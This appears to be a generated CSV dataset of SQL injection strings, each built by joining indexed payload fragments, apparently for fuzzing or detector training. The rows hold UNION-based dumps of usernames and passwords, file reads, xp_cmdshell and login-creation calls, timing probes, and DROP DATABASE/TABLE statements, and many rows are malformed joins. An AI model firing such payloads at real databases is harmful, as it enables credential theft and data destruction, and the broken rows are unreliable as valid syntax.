sig_vector,sig_string
"[5, 36, 81]",) and  (select @@version） create table test like users;
"[6, 32, 80]"," 1)) or  union select 1,2,(database())  and 1=1;"
"[19, 57, 81]"," or'1'='1union select 1,@@datadir,3 create table test like users;"
"[11, 29, 82]", ) or  drop database db drop table sc3；
"[1, 57, 78]","') orunion select 1,@@datadir,3 = 1 union select 1,2,3  /*"
"[17, 32, 78]"," ' and 1=2 union select 1,2,(database())  = 1 union select 1,2,3  /*"
"[11, 49, 81]"," ) or  union select 1,2,load_file('C://1.txt') create table test like users;"
"[12, 24, 81]","1 ' 1=(if((user() regexp '^r'),1,0)) create table test like users;"
"[5, 56, 67]",") and union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)';--"
"[4, 51, 68]","' and union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 */"
"[5, 44, 81]",") and create table dirs(paths varchar(100), id int) create table test like users;"
"[19, 36, 72]", or'1'='1 (select @@version） = 2 --
"[6, 36, 80]", 1)) or  (select @@version） and 1=1;
"[19, 32, 81]"," or'1'='1 union select 1,2,(database())  create table test like users;"
"[19, 24, 81]"," or'1'='1 1=(if((user() regexp '^r'),1,0)) create table test like users;"
"[12, 57, 81]","1 'union select 1,@@datadir,3 create table test like users;"
"[41, 78, 81]","exec master.dbo.sp_addlogin username = 1 union select 1,2,3  /* create table test like users;"
"[1, 29, 78]","') or drop database db = 1 union select 1,2,3  /*"
"[1, 32, 78]","') or union select 1,2,(database())  = 1 union select 1,2,3  /*"
"[17, 57, 78]"," ' and 1=2union select 1,@@datadir,3 = 1 union select 1,2,3  /*"
"[11, 32, 81]"," ) or  union select 1,2,(database())  create table test like users;"
"[5, 51, 67]",") and union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3';--"
"[57, 56, 67]","union select 1,@@datadir,3union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)';--"
"[15, 56, 82]"," and 1=2 union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) drop table sc3；"
"[6, 29, 81]", 1)) or  drop database db create table test like users;
"[6, 62, 81]", 1)) or  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= create table test like users;
"[33, 54, 80]"," exec master..xp_cmdshell 'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 and 1=1;"
"[26, 36, 80]"," union select 1,1,1,load_file(c:\\boot.ini) 
 (select @@version） and 1=1;"
"[51, 32, 9]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 union select 1,2,(database())  1 or "
"[23, 32, 3]"," union select 1,username,password from users where id=2 union select 1,2,(database()) '')) or"
"[4, 36, 68]",' and  (select @@version） */
"[6, 51, 80]"," 1)) or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 and 1=1;"
"[19, 36, 81]", or'1'='1 (select @@version） create table test like users;
"[1, 36, 78]","') or (select @@version） = 1 union select 1,2,3  /*"
"[11, 51, 81]"," ) or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 create table test like users;"
"[5, 32, 67]",") and  union select 1,2,(database()) ';--"
"[6, 36, 81]", 1)) or  (select @@version） create table test like users;
"[11, 36, 82]", ) or  (select @@version） drop table sc3；
"[1, 51, 78]","') orunion select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 = 1 union select 1,2,3  /*"
"[5, 51, 81]",") and union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 create table test like users;"
"[5, 51, 12]",") and union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),31 '"
"[11, 44, 82]"," ) or create table dirs(paths varchar(100), id int) drop table sc3；"
"[11, 36, 81]", ) or  (select @@version） create table test like users;
"[63, 36, 78]","1 (select @@version） = 1 union select 1,2,3  /*"
"[19, 36, 60]"," or'1'='1 (select @@version）ord(mid(user(),1,1))=114"
"[6, 32, 81]"," 1)) or  union select 1,2,(database())  create table test like users;"
"[19, 51, 81]"," or'1'='1union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 create table test like users;"
"[11, 51, 82]"," ) or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 drop table sc3；"
"[5, 32, 81]",") and  union select 1,2,(database())  create table test like users;"
"[51, 29, 9]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 drop database db 1 or "
"[51, 23, 46]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 union select 1,username,password from users where id=21"
"[1, 78, 78]","') or = 1 union select 1,2,3  /* = 1 union select 1,2,3  /*"
"[4, 37, 36]",' and  WAITFOR DELAY '0:0:5' (select @@version）
"[6, 32, 3]"," 1)) or  union select 1,2,(database()) '')) or"
